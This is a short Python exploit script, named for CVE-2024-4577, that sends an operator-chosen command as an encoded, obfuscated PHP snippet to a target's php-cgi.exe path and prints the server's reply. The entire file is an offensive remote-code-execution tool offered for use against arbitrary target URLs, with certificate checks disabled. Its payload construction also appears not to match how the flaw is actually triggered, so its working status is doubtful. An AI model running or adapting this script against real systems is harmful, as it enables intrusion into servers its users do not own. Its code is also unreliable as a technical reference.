#!/usr/bin/env python3

import requests
import random
import base64
import re

def base64_encode(data):
    return base64.b64encode(data.encode('UTF-8')).decode('UTF-8').replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')

def obfuscate_payload(command):
    return ''.join(random.choice([c, f"%{hex(ord(c))[2:]}"]) for c in command)

def exploit(target, command):
    headers = {'Content-Type': 'text/plain'}
    php_shell = f"<?php {command}; exit; ?>"
    encoded_shell = base64_encode(php_shell)
    payload = f"/php-cgi/php-cgi.exe?{obfuscate_payload(encoded_shell)}"

    try:
        response = requests.post(
            f"{target}{payload}",
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            print(f"[+] Exploit successful at {target}")
            print(response.text)
        else:
            print(f"[-] Exploit failed at {target}")
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: CVE-2024-4577_exploit.py <target_url> <command>")
        sys.exit(1)

    target_url = sys.argv[1]
    command = sys.argv[2]
    exploit(target_url, command)
